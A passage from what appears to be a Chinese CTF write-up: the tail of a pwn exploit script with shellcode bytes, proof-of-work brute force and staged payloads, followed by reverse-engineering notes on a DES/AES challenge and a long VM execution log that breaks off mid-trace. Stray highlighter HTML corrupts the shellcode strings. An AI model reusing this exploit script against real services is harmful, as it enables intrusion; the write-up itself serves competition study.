class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span>'<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>06(<span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>6<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span># 0<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>03sh<span class="hljs-tag">\<span class="hljs-name">t</span></span>4<span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>9<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span>'<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>05(<span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>5<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span>#<span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>19<span class="hljs-formula">$'( <span class="hljs-tag">\<span class="hljs-name">x</span></span>03 (<span class="hljs-tag">\<span class="hljs-name">xbd</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>00<span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>5<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span># (<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">xab</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>0f<span class="hljs-tag">\<span class="hljs-name">x</span></span>024<span class="hljs-tag">\<span class="hljs-name">x</span></span>0c<span class="hljs-tag">\<span class="hljs-name">x</span></span>01<span class="hljs-tag">\<span class="hljs-name">x</span></span>01<span class="hljs-tag">\<span class="hljs-name">x</span></span>01"

def main():
    # Your exploit script goes here
    p.rl()
    cond = p.rl()
    found = False
    for i in range(255):
        print(i)
        if found:
            break
        for j in range(255):
            if found:
                break
            for k in range(255):
                s = bytes([i, j, k])
                if eval(cond):
                    print(s)
                    p.ru('&gt;')
                    p.sl(s)
                    found = True
                    break
    cur = datetime.datetime.now()
    p.ru(b'Binary Dump:<span class="hljs-tag">\<span class="hljs-name">n</span></span>')
    binary = p.ru('<span class="hljs-tag">\<span class="hljs-name">n</span>=</span>==')[:-3]
    binary = base64.b64decode(binary)
    binary = gzip.decompress(binary)
    p.ru('Faster &gt; <span class="hljs-tag">\<span class="hljs-name">n</span></span>')
    try:
        regex = b"<span class="hljs-tag">\<span class="hljs-name">xe</span></span>0<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>27<span class="hljs-tag">\<span class="hljs-name">x</span></span>1c<span class="hljs-tag">\<span class="hljs-name">x</span></span>00<span class="hljs-tag">\<span class="hljs-name">xbf</span></span><span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>18<span class="hljs-tag">\<span class="hljs-name">x</span></span>00<span class="hljs-tag">\<span class="hljs-name">xbe</span></span><span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>25<span class="hljs-tag">\<span class="hljs-name">xf</span></span>0<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">x</span></span>20<span class="hljs-tag">\<span class="hljs-name">x</span></span>00<span class="hljs-tag">\<span class="hljs-name">xc</span></span>4<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>20<span class="hljs-tag">\<span class="hljs-name">x</span></span>00<span class="hljs-tag">\<span class="hljs-name">xc</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>8f"
        first = binary.index(regex)
        answer = bytes(solver.solve(binary, first))
        p.s(answer)
        #p.ru('Name<span class="hljs-tag">\<span class="hljs-name">n</span></span>')
        p.s('AAnciety')
        #p.ru('come')
        p.s(stage1)
    except:
        pass
    cur = datetime.datetime.now() - cur

    p.s(stage2)
    print(cur)


    with open('bin', 'wb') as f:
        f.write(binary)
    p.irt()

if __name__ == '__main__':
    main()</span></code></pre><h2 id="re"><a class="header-link" href="#re"></a>re</h2>
<h3 id="parse"><a class="header-link" href="#parse"></a>Parse</h3>
<p>flag 括号内的内容之包含三种成分：&quot;+&quot;, &quot;_&quot; 和其他字符
两个加密算法，des，aes-128，均采用了 CBC 模式，填充模式为 PKCS5Padding
Sub_70f6 : des
Sub_6e68: aes-128
计算过程类似于算数表达式的倒推，可以把 &quot;_&quot; 想想为乘法（实际做des），&quot;+&quot; 为加法（做aes）。
这里的 &quot;_&quot; 满足右结合律，&quot;+&quot; 左结合律。
然后就是判断了，由于&quot;_&quot; 优先级高于 &quot;+&quot;，所以除非最后 flag 格式为 A_B_C_D_...，此时最后做的为 des 加密；否则最后做的必定是一次 aes 加密。因此我们可以采用上述两种算法对密文进行还原后，看它的 padding 内容来进行判断（这里采用了 PKCS5 Padding，所以最后的补位为对其值）。然后继续递归调用上述过程就可以还原出最中结果了。</p>
<h3 id="flw"><a class="header-link" href="#flw"></a>FLw</h3>
<p>刚开始 ida7.0 32bit 无法打开，就用 ida64 打开后分析了下程序的基本逻辑，去除了一个 SEH（方法很简单直接改跳转到 handler），然后 patch 了一些混淆内容，就可以正常打开并反编译了。
程序逻辑就是一个vm，所以直接写脚本打印执行日志。最后打印的日志信息如下：</p>
<pre class="hljs"><code>the <span class="hljs-built_in">log</span>
0 <span class="hljs-keyword">read</span> <span class="hljs-keyword">input</span>
<span class="hljs-keyword">stack</span>[0] = input_len
1 <span class="hljs-keyword">stack</span>[1] = 28
3 <span class="hljs-keyword">stack</span>[2] = <span class="hljs-keyword">stack</span>[1] - <span class="hljs-keyword">stack</span>[0]
4 <span class="hljs-keyword">stack</span>[2] must be 0
5 <span class="hljs-keyword">stack</span>[3] = <span class="hljs-keyword">input</span>[0]
<span class="hljs-keyword">stack</span>[4] = <span class="hljs-keyword">input</span>[1]
<span class="hljs-keyword">stack</span>[5] = <span class="hljs-keyword">input</span>[2]
<span class="hljs-keyword">stack</span>[6] = <span class="hljs-keyword">input</span>[3]
<span class="hljs-keyword">stack</span>[7] = <span class="hljs-keyword">input</span>[4]
<span class="hljs-keyword">stack</span>[8] = <span class="hljs-keyword">input</span>[5]
<span class="hljs-keyword">stack</span>[9] = <span class="hljs-keyword">input</span>[6]
<span class="hljs-keyword">stack</span>[10] = <span class="hljs-keyword">input</span>[7]
<span class="hljs-keyword">stack</span>[11] = <span class="hljs-keyword">input</span>[8]
<span class="hljs-keyword">stack</span>[12] = <span class="hljs-keyword">input</span>[9]
<span class="hljs-keyword">stack</span>[13] = <span class="hljs-keyword">input</span>[10]
<span class="hljs-keyword">stack</span>[14] = <span class="hljs-keyword">input</span>[11]
<span class="hljs-keyword">stack</span>[15] = <span class="hljs-keyword">input</span>[12]
<span class="hljs-keyword">stack</span>[16] = <span class="hljs-keyword">input</span>[13]
<span class="hljs-keyword">stack</span>[17] = <span class="hljs-keyword">input</span>[14]
<span class="hljs-keyword">stack</span>[18] = <span class="hljs-keyword">input</span>[15]
<span class="hljs-keyword">stack</span>[19] = <span class="hljs-keyword">input</span>[16]
<span class="hljs-keyword">stack</span>[20] = <span class="hljs-keyword">input</span>[17]
<span class="hljs-keyword">stack</span>[21] = <span class="hljs-keyword">input</span>[18]
<span class="hljs-keyword">stack</span>[22] = <span class="hljs-keyword">input</span>[19]
<span class="hljs-keyword">stack</span>[23] = <span class="hljs-keyword">input</span>[20]
<span class="hljs-keyword">stack</span>[24] = <span class="hljs-keyword">input</span>[21]
<span class="hljs-keyword">stack</span>[25] = <span class="hljs-keyword">input</span>[22]
<span class="hljs-keyword">stack</span>[26] = <span class="hljs-keyword">input</span>[23]
<span class="hljs-keyword">stack</span>[27] = <span class="hljs-keyword">input</span>[24]
<span class="hljs-keyword">stack</span>[28] = <span class="hljs-keyword">input</span>[25]
<span class="hljs-keyword">stack</span>[29] = <span class="hljs-keyword">input</span>[26]
<span class="hljs-keyword">stack</span>[30] = <span class="hljs-keyword">input</span>[27]
memset <span class="hljs-keyword">input</span> 0
6 <span class="hljs-keyword">table</span>[25] = <span class="hljs-keyword">stack</span>[3]
8 <span class="hljs-keyword">table</span>[26] = <span class="hljs-keyword">stack</span>[4]
10 <span class="hljs-keyword">table</span>[27] = <span class="hljs-keyword">stack</span>[5]
12 <span class="hljs-keyword">table</span>[28] = <span class="hljs-keyword">stack</span>[6]
14 <span class="hljs-keyword">table</span>[29] = <span class="hljs-keyword">stack</span>[7]
16 <span class="hljs-keyword">table</span>[30] = <span class="hljs-keyword">stack</span>[8]
18 <span class="hljs-keyword">table</span>[31] = <span class="hljs-keyword">stack</span>[9]
20 <span class="hljs-keyword">table</span>[32] = <span class="hljs-keyword">stack</span>[10]
22 <span class="hljs-keyword">table</span>[33] = <span class="hljs-keyword">stack</span>[11]
24 <span class="hljs-keyword">table</span>[34] = <span class="hljs-keyword">stack</span>[12]
26 <span class="hljs-keyword">table</span>[35] = <span class="hljs-keyword">stack</span>[13]
28 <span class="hljs-keyword">table</span>[36] = <span class="hljs-keyword">stack</span>[14]
30 <span class="hljs-keyword">table</span>[37] = <span class="hljs-keyword">stack</span>[15]
32 <span class="hljs-keyword">table</span>[38] = <span class="hljs-keyword">stack</span>[16]
34 <span class="hljs-keyword">table</span>[39] = <span class="hljs-keyword">stack</span>[17]
36 <span class="hljs-keyword">table</span>[40] = <span class="hljs-keyword">stack</span>[18]
38 <span class="hljs-keyword">table</span>[41] = <span class="hljs-keyword">stack</span>[19]
40 <span class="hljs-keyword">table</span>[42] = <span class="hljs-keyword">stack</span>[20]
42 <span class="hljs-keyword">table</span>[43] = <span class="hljs-keyword">stack</span>[21]
44 <span class="hljs-keyword">table</span>[44] = <span class="hljs-keyword">stack</span>[22]
46 <span class="hljs-keyword">table</span>[45] = <span class="hljs-keyword">stack</span>[23]
48 <span class="hljs-keyword">table</span>[46] = <span class="hljs-keyword">stack</span>[24]
50 <span class="hljs-keyword">table</span>[47] = <span class="hljs-keyword">stack</span>[25]
52 <span class="hljs-keyword">table</span>[48] = <span class="hljs-keyword">stack</span>[26]
54 <span class="hljs-keyword">table</span>[49] = <span class="hljs-keyword">stack</span>[27]
56 <span class="hljs-keyword">table</span>[50] = <span class="hljs-keyword">stack</span>[28]
58 <span class="hljs-keyword">table</span>[51] = <span class="hljs-keyword">stack</span>[29]
60 <span class="hljs-keyword">table</span>[52] = <span class="hljs-keyword">stack</span>[30]
62 <span class="hljs-keyword">stack</span>[31] = <span class="hljs-keyword">table</span>[25]
64 <span class="hljs-keyword">stack</span>[32] = 68
66 <span class="hljs-keyword">stack</span>[33] = <span class="hljs-keyword">stack</span>[32] - <span class="hljs-keyword">stack</span>[31]
67 <span class="hljs-keyword">stack</span>[33] must be 0
68 <span class="hljs-keyword">stack</span>[34] = 0
70 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[34]
72 <span class="hljs-keyword">stack</span>[35] = <span class="hljs-keyword">table</span>[26]
74 <span class="hljs-keyword">stack</span>[36] = 101
76 <span class="hljs-keyword">stack</span>[37] = <span class="hljs-keyword">stack</span>[36] - <span class="hljs-keyword">stack</span>[35]
77 <span class="hljs-keyword">stack</span>[37] must be 0
78 <span class="hljs-keyword">stack</span>[38] = 32
80 <span class="hljs-keyword">stack</span>[39] = <span class="hljs-keyword">table</span>[255]
82 <span class="hljs-keyword">stack</span>[40] = <span class="hljs-keyword">table</span>[255]
84 <span class="hljs-keyword">stack</span>[41] = <span class="hljs-keyword">stack</span>[39] + <span class="hljs-keyword">stack</span>[38]
85 <span class="hljs-keyword">stack</span>[42] = <span class="hljs-keyword">stack</span>[41] + <span class="hljs-keyword">stack</span>[40]
86 <span class="hljs-keyword">stack</span>[43] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[42]]
87 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[43]
88 <span class="hljs-keyword">stack</span>[44] = 33
90 <span class="hljs-keyword">stack</span>[45] = <span class="hljs-keyword">table</span>[255]
92 <span class="hljs-keyword">stack</span>[46] = <span class="hljs-keyword">table</span>[255]
94 <span class="hljs-keyword">stack</span>[47] = <span class="hljs-keyword">stack</span>[45] + <span class="hljs-keyword">stack</span>[44]
95 <span class="hljs-keyword">stack</span>[48] = <span class="hljs-keyword">stack</span>[47] + <span class="hljs-keyword">stack</span>[46]
96 <span class="hljs-keyword">stack</span>[49] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[48]]
97 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[49]
98 <span class="hljs-keyword">stack</span>[50] = 3
100 <span class="hljs-keyword">table</span>[254] = <span class="hljs-keyword">stack</span>[50]
102 <span class="hljs-keyword">stack</span>[51] = <span class="hljs-keyword">table</span>[255]
104 <span class="hljs-keyword">stack</span>[52] = 3
106 <span class="hljs-keyword">stack</span>[53] = <span class="hljs-keyword">stack</span>[52] * <span class="hljs-keyword">stack</span>[51]
107 <span class="hljs-keyword">stack</span>[54] = <span class="hljs-keyword">table</span>[254]
109 <span class="hljs-keyword">stack</span>[55] = 63
111 <span class="hljs-keyword">stack</span>[56] = <span class="hljs-keyword">stack</span>[54] + <span class="hljs-keyword">stack</span>[53]
112 <span class="hljs-keyword">stack</span>[57] = <span class="hljs-keyword">stack</span>[56] + <span class="hljs-keyword">stack</span>[55]
113 <span class="hljs-keyword">stack</span>[58] = field % 58 , field = field / 58
115 <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[57]] = <span class="hljs-keyword">stack</span>[58]
116 <span class="hljs-keyword">stack</span>[59] = 1
118 <span class="hljs-keyword">stack</span>[60] = <span class="hljs-keyword">table</span>[254]
120 <span class="hljs-keyword">stack</span>[61] = <span class="hljs-keyword">stack</span>[60] - <span class="hljs-keyword">stack</span>[59]
121 <span class="hljs-keyword">table</span>[254] = <span class="hljs-keyword">stack</span>[61]
123 <span class="hljs-keyword">stack</span>[62] = <span class="hljs-keyword">table</span>[254]
125 <span class="hljs-keyword">if</span> <span class="hljs-keyword">stack</span>[62] != 0: i -= 23
<span class="hljs-keyword">else</span> : i +=2
127 <span class="hljs-keyword">stack</span>[63] = <span class="hljs-keyword">table</span>[255]
129 <span class="hljs-keyword">stack</span>[64] = 1
131 <span class="hljs-keyword">stack</span>[65] = <span class="hljs-keyword">stack</span>[64] + <span class="hljs-keyword">stack</span>[63]
132 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[65]
134 <span class="hljs-keyword">stack</span>[66] = <span class="hljs-keyword">table</span>[255]
136 <span class="hljs-keyword">stack</span>[67] = 10
138 <span class="hljs-keyword">stack</span>[68] = <span class="hljs-keyword">stack</span>[67] - <span class="hljs-keyword">stack</span>[66]
139 <span class="hljs-keyword">if</span> <span class="hljs-keyword">stack</span>[68] != 0: i -= 61
<span class="hljs-keyword">else</span> : i +=2
141 <span class="hljs-keyword">stack</span>[69] = <span class="hljs-keyword">table</span>[29]
143 <span class="hljs-keyword">stack</span>[70] = 84
145 <span class="hljs-keyword">stack</span>[71] = <span class="hljs-keyword">stack</span>[70] - <span class="hljs-keyword">stack</span>[69]
146 <span class="hljs-keyword">stack</span>[71] must be 0
147 <span class="hljs-keyword">stack</span>[72] = <span class="hljs-keyword">table</span>[30]
149 <span class="hljs-keyword">stack</span>[73] = 70
151 <span class="hljs-keyword">stack</span>[74] = <span class="hljs-keyword">stack</span>[73] - <span class="hljs-keyword">stack</span>[72]
152 <span class="hljs-keyword">stack</span>[74] must be 0
153 <span class="hljs-keyword">stack</span>[75] = <span class="hljs-keyword">table</span>[31]
155 <span class="hljs-keyword">stack</span>[76] = 123
157 <span class="hljs-keyword">stack</span>[77] = <span class="hljs-keyword">stack</span>[76] - <span class="hljs-keyword">stack</span>[75]
158 <span class="hljs-keyword">stack</span>[77] must be 0
159 <span class="hljs-keyword">stack</span>[78] = 0
161 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[78]
163 <span class="hljs-keyword">stack</span>[79] = field, field = 0
164 165 <span class="hljs-keyword">stack</span>[80] = <span class="hljs-keyword">table</span>[255]
167 <span class="hljs-keyword">stack</span>[81] = 64
169 <span class="hljs-keyword">stack</span>[82] = <span class="hljs-keyword">stack</span>[81] + <span class="hljs-keyword">stack</span>[80]
170 <span class="hljs-keyword">stack</span>[83] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[82]]
171 <span class="hljs-keyword">stack</span>[84] = base58[<span class="hljs-keyword">stack</span>[83]]
172 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[84]
173 <span class="hljs-keyword">stack</span>[85] = <span class="hljs-keyword">table</span>[255]
175 <span class="hljs-keyword">stack</span>[86] = 64
177 <span class="hljs-keyword">stack</span>[87] = <span class="hljs-keyword">stack</span>[86] + <span class="hljs-keyword">stack</span>[85]
178 <span class="hljs-keyword">stack</span>[88] = field, field = 0
179 <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[87]] = <span class="hljs-keyword">stack</span>[88]
180 <span class="hljs-keyword">stack</span>[89] = <span class="hljs-keyword">table</span>[255]
182 <span class="hljs-keyword">stack</span>[90] = 1
184 <span class="hljs-keyword">stack</span>[91] = <span class="hljs-keyword">stack</span>[90] + <span class="hljs-keyword">stack</span>[89]
185 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[91]
187 <span class="hljs-keyword">stack</span>[92] = <span class="hljs-keyword">table</span>[255]
189 <span class="hljs-keyword">stack</span>[93] = 30
191 <span class="hljs-keyword">stack</span>[94] = <span class="hljs-keyword">stack</span>[93] - <span class="hljs-keyword">stack</span>[92]
192 <span class="hljs-keyword">if</span> <span class="hljs-keyword">stack</span>[94] != 0: i -= 29
<span class="hljs-keyword">else</span> : i +=2
194 <span class="hljs-keyword">stack</span>[95] = <span class="hljs-keyword">table</span>[28]
196 <span class="hljs-keyword">stack</span>[96] = 67
198 <span class="hljs-keyword">stack</span>[97] = <span class="hljs-keyword">stack</span>[96] - <span class="hljs-keyword">stack</span>[95]
199 <span class="hljs-keyword">stack</span>[97] must be 0
200 <span class="hljs-keyword">stack</span>[98] = <span class="hljs-keyword">table</span>[27]
202 <span class="hljs-keyword">stack</span>[99] = 49
204 <span class="hljs-keyword">stack</span>[100] = <span class="hljs-keyword">stack</span>[99] - <span class="hljs-keyword">stack</span>[98]
205 <span class="hljs-keyword">stack</span>[100] must be 0
206 <span class="hljs-keyword">stack</span>[101] = 0
208 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[101]
210 <span class="hljs-keyword">stack</span>[102] = 0
212 <span class="hljs-keyword">stack</span>[103] = 0
214 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[102]
215 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[103]
216 <span class="hljs-keyword">stack</span>[104] = <span class="hljs-keyword">table</span>[255]
218 <span class="hljs-keyword">stack</span>[105] = 64
220 <span class="hljs-keyword">stack</span>[106] = <span class="hljs-keyword">table</span>[255]
222 <span class="hljs-keyword">stack</span>[107] = 65
224 <span class="hljs-keyword">stack</span>[108] = <span class="hljs-keyword">stack</span>[105] + <span class="hljs-keyword">stack</span>[104]
225 <span class="hljs-keyword">stack</span>[109] = <span class="hljs-keyword">stack</span>[107] + <span class="hljs-keyword">stack</span>[106]
226 <span class="hljs-keyword">stack</span>[110] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[108]]
227 <span class="hljs-keyword">stack</span>[111] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[109]]
228 <span class="hljs-keyword">stack</span>[112] = <span class="hljs-keyword">stack</span>[111] - <span class="hljs-keyword">stack</span>[110]
229 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[112]
230 <span class="hljs-keyword">stack</span>[113] = <span class="hljs-keyword">table</span>[255]
232 <span class="hljs-keyword">stack</span>[114] = 65
234 <span class="hljs-keyword">stack</span>[115] = <span class="hljs-keyword">stack</span>[114] + <span class="hljs-keyword">stack</span>[113]
235 <span class="hljs-keyword">stack</span>[116] = field, field = 0
236 <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[115]] = <span class="hljs-keyword">stack</span>[116]
237 <span class="hljs-keyword">stack</span>[117] = <span class="hljs-keyword">table</span>[255]
239 <span class="hljs-keyword">stack</span>[118] = 65
241 <span class="hljs-keyword">stack</span>[119] = <span class="hljs-keyword">table</span>[255]
243 <span class="hljs-keyword">stack</span>[120] = 66
245 <span class="hljs-keyword">stack</span>[121] = <span class="hljs-keyword">stack</span>[118] + <span class="hljs-keyword">stack</span>[117]
246 <span class="hljs-keyword">stack</span>[122] = <span class="hljs-keyword">stack</span>[120] + <span class="hljs-keyword">stack</span>[119]
247 <span class="hljs-keyword">stack</span>[123] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[121]]
248 <span class="hljs-keyword">stack</span>[124] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[122]]
249 <span class="hljs-keyword">stack</span>[125] = <span class="hljs-keyword">stack</span>[124] + <span class="hljs-keyword">stack</span>[123]
250 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[125]
251 <span class="hljs-keyword">stack</span>[126] = <span class="hljs-keyword">table</span>[255]
253 <span class="hljs-keyword">stack</span>[127] = 66
255 <span class="hljs-keyword">stack</span>[128] = <span class="hljs-keyword">stack</span>[127] + <span class="hljs-keyword">stack</span>[126]
256 <span class="hljs-keyword">stack</span>[129] = field, field = 0
257 <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[128]] = <span class="hljs-keyword">stack</span>[129]
258 <span class="hljs-keyword">stack</span>[130] = <span class="hljs-keyword">table</span>[255]
260 <span class="hljs-keyword">stack</span>[131] = 64
262 <span class="hljs-keyword">stack</span>[132] = <span class="hljs-keyword">table</span>[255]
264 <span class="hljs-keyword">stack</span>[133] = 66
266 <span class="hljs-keyword">stack</span>[134] = <span class="hljs-keyword">stack</span>[131] + <span class="hljs-keyword">stack</span>[130]
267 <span class="hljs-keyword">stack</span>[135] = <span class="hljs-keyword">stack</span>[133] + <span class="hljs-keyword">stack</span>[132]
268 <span class="hljs-keyword">stack</span>[136] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[134]]
269 <span class="hljs-keyword">stack</span>[137] = <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[135]]
270 <span class="hljs-keyword">stack</span>[138] = <span class="hljs-keyword">stack</span>[137] ^ <span class="hljs-keyword">stack</span>[136]
271 field = (field &lt;&lt; 8) + <span class="hljs-keyword">stack</span>[138]
272 <span class="hljs-keyword">stack</span>[139] = <span class="hljs-keyword">table</span>[255]
274 <span class="hljs-keyword">stack</span>[140] = 64
276 <span class="hljs-keyword">stack</span>[141] = <span class="hljs-keyword">stack</span>[140] + <span class="hljs-keyword">stack</span>[139]
277 <span class="hljs-keyword">stack</span>[142] = field, field = 0
278 <span class="hljs-keyword">table</span>[<span class="hljs-keyword">stack</span>[141]] = <span class="hljs-keyword">stack</span>[142]
279 <span class="hljs-keyword">stack</span>[143] = <span class="hljs-keyword">table</span>[255]
281 <span class="hljs-keyword">stack</span>[144] = 3
283 <span class="hljs-keyword">stack</span>[145] = <span class="hljs-keyword">stack</span>[144] + <span class="hljs-keyword">stack</span>[143]
284 <span class="hljs-keyword">table</span>[255] = <span class="hljs-keyword">stack</span>[145]
286 <span class="hljs-keyword">stack</span>[146] = <span class="hljs-keyword">table</span>[255]
288 <span class="hljs-keyword">stack</span>[147] = 30
290 <span class="hljs-keyword">stack</span>[148] = <span class="hljs-keyword">stack</span>[147] - <span class="hljs-keyword">stack</span>[146]
291 <span class="hljs-keyword">if</span> <span class="hljs-keyword">stack</span>[148] != 0: i -= 81
<span class="hljs-keyword">else</span> : i +=2
293 <span class="hljs-keyword">stack</span>[149] = <span class="hljs-keyword">table</span>[52]
295 <span class="hljs-keyword">stack</span>[150] = 125
297 <span class="hljs-keyword">stack</span>[151] = <span class="hljs-keyword">stack</span>[150] - <span class="hljs-keyword">stack</span>[149]
298 <span class="hljs-keyword">stack</span>[151] must be 0
299 <span class="hljs-keyword">stack</span>[152] = <span class="hljs-keyword">table</span>[64]
301 <span class="hljs-keyword">stack</span>[153] = 122
303 <span class="hljs-keyword">stack</span>[154] = <span class="hljs-keyword">stack</span>[153] - <span class="hljs-keyword">stack</span>[152]
304 <span class="hljs-keyword">stack</span>[154] must be 0
305 <span class="hljs-keyword">stack</span>[155] = <span class="hljs-keyword">table</span>[65]
307 <span class="hljs-keyword">stack</span>[156] = 25
309 <span class="hljs-keyword">stack</span>[157] = <span class="hljs-keyword">stack</span>[156] - <span class="hljs-keyword">stack</span>[155]
310 <span class="hljs-keyword">stack</span>[157] must be 0
311 <span class="hljs-keyword">stack</span>[158] = <span class="hljs-keyword">table</span>[66]
313 <span class="hljs-keyword">stack</span>[159] = 79
315 <span class="hljs-keyword">stack</span>[160] = <span class="hljs-keyword">stack</span>[159] - <span class="hljs-keyword">stack</span>[158]
316 <span class="hljs-keyword">stack</span>[160] must be 0
317 <span class="hljs-keyword">stack</span>[161] = <span class="hljs-keyword">table</span>[67]
319 <span class="hljs-keyword">stack</span>[162] = 110
321 <span class="hljs-keyword">stack</span>[163] = <span class="hljs-keyword">stack</span>[162] - <span class="hljs-keyword">stack</span>[161]
322 <span class="hljs-keyword">stack</span>[163] must be 0
323 <span class="hljs-keyword">stack</span>[164] = <span class="hljs-keyword">table</span>[68]
325 <span class="hljs-keyword">stack</span>[165] = 14
327 <span class="hljs-keyword">stack</span>[166] = <span class="hljs-keyword">stack</span>[165] - <span class="hljs-keyword">stack</span>[164]
328 <span class="hljs-keyword">stack</span>[166] must be 0
329 <span class="hljs-keyword">stack</span>[167] = <span class="hljs-keyword">table</span>[69]
331 <span class="hljs-keyword">stack</span>[168] = 86
333 <span class="hljs-keyword">stack</span>[169] = <span class="hljs-keyword">stack</span>[168] - <span class="hljs-keyword">stack</span>[167]
334 <span class="hljs-keyword">stack</span>[169] must be 0
335 <span class="hljs-keyword">stack</span>[170] = <span class="hljs-keyword">table</span>[70]
337 <span class="hljs-keyword">stack</span>[171] = 175
339 <span class="hljs-keyword">stack</span>[172] = <span class="hljs-keyword">stack</span>[171] - <span class="hljs-keyword">stack</span>[170]
340 <span class="hljs-keyword">stack</span>[172] must be 0
341 <span class="hljs-keyword">stack</span>[173] = <span class="hljs-keyword">table</span>[71]
343 <span class="hljs-keyword">stack</span>[174] = 31
345 <span class="hljs-keyword">stack</span>[175] = <span class="hljs-keyword">stack</span>[174] - <span class="hljs-keyword">stack</span>[173]
346 <span class="hljs-keyword">stack</span>[175] must be 0
347 <span class="hljs-keyword">stack</span>[176] = <span class="hljs-keyword">table</span>[72]
349 <span class="hljs-keyword">stack</span>[177] = 152
351 <span class="hljs-keyword">stack</span>[178] = <span class="hljs-keyword">stack</span>[177] - <span class="hljs-keyword">stack</span>[176]
352 <span class="hljs-keyword">stack</span>[178] must be 0
353 <span class="hljs-keyword">stack</span>[179] = <span class="hljs-keyword">table</span>[73]
355 <span class="hljs-keyword">stack</span>[180] = 88
357 <span class="hljs-keyword">stack</span>[181] = <span class="hljs-keyword">stack</span>[180] - <span class="hljs-keyword">stack</span>[179]
358 <span class="hljs-keyword">stack</span>[181] must be 0
359 <span class="hljs-keyword">stack</span>[182] = <span class="hljs-keyword">table</span>[74]
361 <span class="hljs-keyword">stack</span>[183] = 14
363 <span class="hljs-keyword">stack</span>[184] = <span class="hljs-keyword">stack</span>[183] - <span class="hljs-keyword">stack</span>[182]
364 <span class="hljs-keyword">stack</span>[184] must be 0
365 <span class="hljs-keyword">stack</span>[185] = <span class="hljs-keyword">table</span>[75]
367 <span class="hljs-keyword">stack</span>[186] = 96
